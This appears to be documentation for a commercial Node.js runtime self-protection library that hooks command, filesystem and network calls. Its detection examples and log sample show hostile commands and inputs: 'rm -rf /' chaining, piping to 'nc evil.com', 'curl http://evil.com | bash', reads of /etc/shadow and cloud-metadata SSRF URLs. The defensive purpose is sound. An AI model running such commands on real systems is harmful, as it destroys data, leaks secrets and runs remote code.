# Sink-aware RASP

> ⚠️ **Commercial Feature**: This feature requires a ContractShield Pro or Enterprise license with the `sink-rasp` feature enabled.

## What is Sink-aware RASP?

Runtime Application Self-Protection (RASP) that intercepts dangerous function calls ("sinks") at runtime:

| Sink Category | Protected Functions | Attacks Blocked |
|--------------|---------------------|-----------------|
| **Command Execution** | `exec`, `execSync`, `spawn`, `spawnSync`, `execFile` | Command injection |
| **Filesystem** | `readFile`, `writeFile`, `unlink`, `readdir`, `stat` | Path traversal |
| **HTTP Egress** | `http.request`, `https.request`, `fetch` | SSRF |
| **SQL** | `query`, `execute` (coming soon) | SQL injection |
| **Eval** | `eval`, `Function`, `vm.runInContext` (coming soon) | Code injection |

## Quick Start

```typescript
import { initSinkRasp } from '@cshield/sink-rasp';

initSinkRasp({
  licenseKey: process.env.CONTRACTSHIELD_LICENSE_KEY!,
  mode: 'enforce',  // or 'monitor' to log without blocking
});
```

## Configuration

### Full Options

```typescript
import { initSinkRasp, SinkRaspOptions } from '@cshield/sink-rasp';

const options: SinkRaspOptions = {
  // Required: Your license key
  licenseKey: process.env.CONTRACTSHIELD_LICENSE_KEY!,

  // Mode: 'monitor' logs only, 'enforce' blocks attacks
  mode: 'enforce',

  // Which sinks to protect
  sinks: {
    commandExecution: true,  // or detailed options
    filesystem: true,
    httpEgress: {
      blockPrivateIPs: true,      // Default: true
      blockMetadataEndpoints: true, // Default: true (AWS/GCP/Azure metadata)
      allowedHosts: ['api.stripe.com', '*.amazonaws.com'],
    },
    sql: false,  // Coming soon
    eval: false, // Coming soon
  },

  // Global allowlist for known-safe operations
  allowlist: {
    commands: ['git', 'node', 'npm'],
    paths: ['/tmp/', '/var/log/'],
    hosts: ['api.stripe.com', '*.amazonaws.com'],
  },

  // Callbacks
  onBlock: (event) => {
    console.error('Attack blocked:', event);
    // Send to SIEM, alert, etc.
  },
  onDetect: (event) => {
    console.log('Detection:', event);
    // Useful in monitor mode
  },
};

const rasp = initSinkRasp(options);
```

## Operation Modes

### Enforce Mode

Blocks dangerous operations and throws an error:

```typescript
initSinkRasp({
  licenseKey: LICENSE,
  mode: 'enforce',
});

// This will throw: [ContractShield] Blocked: Command injection detected
execSync('echo hello; rm -rf /');
```

### Monitor Mode

Logs detections without blocking (useful for initial deployment):

```typescript
initSinkRasp({
  licenseKey: LICENSE,
  mode: 'monitor',
});

// This executes but logs a warning
execSync('echo hello; rm -rf /');
```

## Manual Checks

Use the instance to manually check inputs:

```typescript
const rasp = initSinkRasp({
  licenseKey: LICENSE,
  mode: 'enforce',
});

// Check user input before using it
const userInput = req.body.filename;
const result = rasp.checkPath(userInput);

if (result.dangerous) {
  return res.status(400).json({ error: 'Invalid path' });
}

// Safe to use
const content = readFileSync(userInput);
```

## Request Context Tracking

Link RASP events to HTTP requests for better observability:

### Express

```typescript
import express from 'express';
import { initSinkRasp, expressContextMiddleware } from '@cshield/sink-rasp';

const app = express();

// Add context middleware BEFORE your routes
app.use(expressContextMiddleware());

initSinkRasp({
  licenseKey: LICENSE,
  mode: 'enforce',
  onBlock: (event) => {
    // event.requestId links to the HTTP request
    console.error(`Request ${event.requestId} blocked: ${event.reason}`);
  },
});
```

### Fastify

```typescript
import Fastify from 'fastify';
import { initSinkRasp, fastifyContextPlugin } from '@cshield/sink-rasp';

const fastify = Fastify();

fastify.register(fastifyContextPlugin);

initSinkRasp({
  licenseKey: LICENSE,
  mode: 'enforce',
});
```

## What Gets Detected

### Command Injection

```typescript
// ❌ Blocked: Semicolon chaining
execSync(`echo ${userInput}; rm -rf /`);

// ❌ Blocked: Pipe chaining
execSync(`cat ${userInput} | nc evil.com 1234`);

// ❌ Blocked: Backtick substitution
execSync(`echo \`${userInput}\``);

// ❌ Blocked: $() substitution
execSync(`echo $(${userInput})`);

// ❌ Blocked: Dangerous commands
execSync('curl http://evil.com | bash');

// ✅ Allowed: Safe commands
execSync('echo hello world');
execSync('date');
```

### Path Traversal

```typescript
// ❌ Blocked: Directory traversal
readFileSync('../../etc/passwd');

// ❌ Blocked: URL-encoded traversal
readFileSync('%2e%2e%2fetc/passwd');

// ❌ Blocked: Sensitive files
readFileSync('/etc/shadow');
readFileSync('/proc/self/environ');

// ✅ Allowed: Normal paths
readFileSync('/var/log/app.log');
readFileSync('./config.json');
```

### SSRF

```typescript
// ❌ Blocked: Private IPs
fetch('http://127.0.0.1/admin');
fetch('http://192.168.1.1/');
fetch('http://10.0.0.1/');

// ❌ Blocked: Cloud metadata
fetch('http://169.254.169.254/latest/meta-data/');

// ❌ Blocked: Dangerous protocols
fetch('file:///etc/passwd');
fetch('gopher://evil.com/');

// ✅ Allowed: External APIs
fetch('https://api.stripe.com/v1/charges');
fetch('https://api.github.com/users');
```

## Logging & SIEM Integration

RASP events are logged as structured JSON for SIEM integration:

```json
{
  "timestamp": "2024-01-15T10:30:00.000Z",
  "level": "warn",
  "message": "[ContractShield RASP] blocked: child_process.exec",
  "event": {
    "type": "rasp_detection",
    "sink": "child_process",
    "operation": "exec",
    "action": "blocked",
    "reason": "Command injection detected: pattern:semicolon_chain, dangerous_command:rm",
    "input": "echo hello; rm -rf /",
    "requestId": "550e8400-e29b-41d4-a716-446655440000"
  }
}
```

### Custom Logger

```typescript
import { configureReporter } from '@cshield/sink-rasp';

configureReporter({
  logger: (entry) => {
    // Send to your logging system
    winston.log(entry.level, entry.message, entry.event);

    // Or send to SIEM
    siem.send(entry);
  },
  redactSensitive: true,  // Redact passwords, tokens from logs
  maxInputLength: 200,    // Truncate long inputs
});
```

## Shutdown

To restore original functions (e.g., for testing):

```typescript
import { shutdownSinkRasp } from '@cshield/sink-rasp';

// Or use the instance
const rasp = initSinkRasp({ ... });
rasp.shutdown();
```

## Performance

- **Overhead**: < 1ms per hooked function call
- **Memory**: ~2MB for analyzer patterns
- **Startup**: ~50ms to install hooks

## FAQ

### Can I use this without a license for testing?

Yes, use the license generator to create test licenses:

```bash
npx tsx tools/license-generator/generate.ts --features sink-rasp --duration 7d
```

### What happens if my license expires?

The `initSinkRasp` function will throw a `LicenseError`. Your application will not start unless you handle this error.

### Does this work with TypeScript?

Yes, full TypeScript support with exported types.

### Can I exclude specific operations?

Yes, use the `allowlist` option to exclude known-safe commands, paths, or hosts.

### Is there a performance impact on allowed operations?

Minimal. Allowlist checks happen first and short-circuit further analysis.

## See Also

- [Licensing Documentation](./licensing.md)
- [API Reference](./api/sink-rasp.md)
- [Security Best Practices](./security.md)
